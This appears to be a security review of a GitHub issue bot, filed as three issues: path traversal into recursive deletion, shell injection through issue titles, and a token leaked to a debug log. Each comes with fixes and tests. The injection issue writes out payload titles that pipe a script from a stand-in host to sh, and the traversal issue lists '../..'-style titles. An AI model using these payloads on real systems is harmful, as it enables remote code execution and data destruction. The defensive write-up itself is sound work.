results.vuln: path traversal + unsafe deletion: a title like '../../..' makes cleanScratch rmSync a directory outside scratch/ (src/scratch.js)

filed.title: security: issue title path traversal lets cleanScratch rmSync arbitrary directories
filed.body:
## Vulnerable location
`src/scratch.js:10` — `scratchDir()` builds the path as `path.join(ROOT, it.title.trim().toLowerCase().replace(/\s+/g, '-'))`. The issue title is attacker-controlled GitHub text and only whitespace is replaced, so `/`, `\` and `..` segments pass through unchanged.

`src/scratch.js:21` — `cleanScratch()` then calls `rmSync(<that path>, { recursive: true, force: true })`. `src/scratch.js:15` — `makeScratch()` calls `mkdirSync` on the same path.

## Exploit scenario
Anyone who can open (or edit the title of) an issue sets its title to `../..` (or `../../../home/runner`, `..\..\src`, `.`, `..`). `path.join` normalizes it to a directory outside `scratch/`, e.g. the checkout's parent or the user's home. When the bot runs `cleanScratch(repo, n)` after the issue closes, it recursively deletes that directory, with `force: true` suppressing errors. A title of `.` deletes the whole `scratch/` root, which wipes every other issue's scratch directory. `makeScratch` can also create directories anywhere the process can write.

## Acceptance criteria
- The directory name comes from the issue **number** (e.g. `scratch/<n>-<slug>`), and any slug drawn from the title is restricted to `[a-z0-9-]`, with `.`, `/` and `\` removed or replaced, and non-empty fallback handling.
- `scratchDir` resolves the final path and asserts that it is a strict descendant of `ROOT` (`path.relative(ROOT, dir)` is non-empty, does not start with `..` and is not absolute), throwing an error otherwise. `cleanScratch` and `makeScratch` never touch a path that fails this check.
- Add a test (`node --test`) that stubs `issue()` to return titles `../..`, `..`, `.`, `../../etc`, `..\..\x` and `/abs/path`, and asserts that `scratchDir` stays inside `ROOT` (or throws) and that `cleanScratch` deletes nothing outside `ROOT`. Against the current code the test fails because `scratchDir` returns a path outside `scratch/` for `../..`.

## Blocked by
None

## Parent
#1

results.vuln: command injection: the issue title is interpolated into an execSync shell command (src/snapshot.js)

filed.title: security: shell injection via issue title in snapshot commit
filed.body:
## Vulnerability
`src/snapshot.js:9` builds a shell command by string interpolation and runs it with `execSync`:

```js
execSync(`git add snapshots && git commit -q -m "snapshot #${n}: ${it.title}"`, { cwd });
```

`it.title` is the GitHub issue title — attacker-controlled by anyone who can open or edit an issue. It reaches `/bin/sh` (or `cmd.exe`) unescaped.

## Exploit scenario
An attacker opens an issue titled:

```
x$(curl -s https://evil.example/p.sh | sh)
```

or `x"; curl -s https://evil.example/p.sh | sh; echo "`. When the bot runs `snapshot(repo, n)`, the shell executes the payload with the bot's credentials (gh token, push rights) in `cwd`.

## Fix
Run git without a shell, passing the message as an argv element, e.g.:

```js
execFileSync('git', ['add', 'snapshots'], { cwd });
execFileSync('git', ['commit', '-q', '-m', `snapshot #${n}: ${it.title}`], { cwd });
```

## Acceptance criteria
- [ ] `src/snapshot.js` invokes no shell with GitHub-derived text (no `execSync`/`exec`/`shell: true` with interpolated title/body).
- [ ] The commit message equals `snapshot #<n>: <title>` literally, for any title.
- [ ] New test under `test/` (run by `npm test`) that fails before the fix: in a temp git repo with a `snapshots/` dir, put a fake `gh` first on `PATH` that prints `{"number":7,"title":"x$(touch PWNED)\"; touch PWNED2; echo \"","body":"b"}`; call `snapshot('o/r', 7, tmp)`; assert neither `PWNED` nor `PWNED2` exists in `tmp` and `git log -1 --format=%s` equals the literal message.

## Blocked by
None

## Parent
#1

results.vuln: secret in a log: the Authorization header with GH_TOKEN is written to issuebot-debug.log (src/api.js)

filed.title: security: GH_TOKEN written in plaintext to issuebot-debug.log
filed.body:
## Vulnerable location
`src/api.js:10`, from commit 7f0b802 (closes #2):

```js
const headers = { Authorization: `Bearer ${token}`, Accept: 'application/vnd.github+json' };
appendFileSync(LOG, `${new Date().toISOString()} GET ${url} ${JSON.stringify(headers)}\n`);
```

Every call to `api()` writes the full `Authorization: Bearer <GH_TOKEN>` header to `issuebot-debug.log` in plaintext. The log goes to the current working directory, which is usually the repo root, and `.gitignore` does not exclude it because the repo has no `.gitignore`.

## Exploit scenario
1. An agent or developer runs anything that calls `api('/repos/o/r/issues')`, and the log now contains `"Authorization":"Bearer ghp_..."`.
2. A later `git add -A` / `git commit -a` in that checkout commits `issuebot-debug.log` and pushes it. Agents in this pipeline do this routinely. The token is now public in the repo history.
3. Even without a commit, anyone who can read the log can take the token: CI artifacts, shared machines, logs attached to bug reports. This is exactly the file people will paste when "a GitHub call fails".

## Acceptance criteria
- [ ] The debug log never contains the token or the `Authorization` header value. Log only the method, the URL, and the status, or replace the header value with a redaction such as `Bearer ***`.
- [ ] Add `issuebot-debug.log` to `.gitignore`.
- [ ] Add a test (`node --test`) that sets `GH_TOKEN=test-secret-123`, stubs `globalThis.fetch`, and calls `api('/x')`. It then asserts that `issuebot-debug.log` does not contain `test-secret-123`. This test fails on current `main`.

## Blocked by
None

## Parent
#1
